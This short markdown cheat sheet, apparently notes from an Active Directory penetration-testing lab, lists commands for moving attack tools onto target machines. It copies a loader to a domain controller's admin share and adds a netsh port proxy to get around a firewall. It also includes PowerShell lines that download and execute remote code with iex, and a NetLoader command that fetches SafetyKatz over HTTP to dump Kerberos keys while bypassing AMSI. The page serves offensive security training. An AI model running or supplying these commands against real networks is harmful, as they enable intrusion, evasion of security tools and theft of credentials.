# Transfer files

### Shares

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y 
```

### HTTP Server

1. Port forward to avoid firewall using netsh on target machine

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
```

2. Serve the files using [hfs ](https://www.rejetto.com/hfs/?f=dl)or http simple server

```bash
python3 -m http.server -port 80
```

3. Download the file on target machine

```powershell
# Download and store
(new-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/<File>', '<Dest Path>')

# Download and execute
iex ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/<File>'));

# NetLoader to execute and bypass amsi
NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

